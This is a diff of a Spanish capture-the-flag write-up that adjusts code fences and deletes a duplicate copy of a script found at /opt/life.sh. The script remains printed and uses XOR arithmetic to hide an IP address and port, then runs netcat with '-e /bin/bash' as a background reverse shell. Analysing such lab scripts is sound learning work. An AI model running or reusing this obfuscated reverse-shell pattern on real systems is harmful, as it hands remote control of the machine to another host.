@@ -291,6 +291,7 @@ puedo ejecutar ese script como bilter. hago un cat:
 ```bash
 cat /opt/life.sh
 ```
+```
 #!/bin/bash
 
 set +m
@@ -313,28 +314,7 @@ h=$d
 $e $g $h $f /bin/bash &>/dev/null &
 ```
 wtf? que es eso?
-```
-#!/bin/bash
 
-set +m
-
-v1=$((0xCAFEBABE ^ 0xAC1100BA))
-v2=$((0xDEADBEEF ^ 0x17B4))
-
-a=$((v1 ^ 0xCAFEBABE))
-b=$((v2 ^ 0xDEADBEEF))
-
-c=$(printf "%d.%d.%d.%d" $(( (a >> 24) & 0xFF )) $(( (a >> 16) & 0xFF )) $(( (a >> 8) & 0xFF )) $(( a & 0xFF )))
-
-d=$((b))
-
-e="nc"
-f="-e"
-g=$c
-h=$d
-
-$e $g $h $f /bin/bash &>/dev/null &
-```
 después de hacer los cálculos:
 Los cálculos realizados en el script dan como resultado la siguiente información:
 
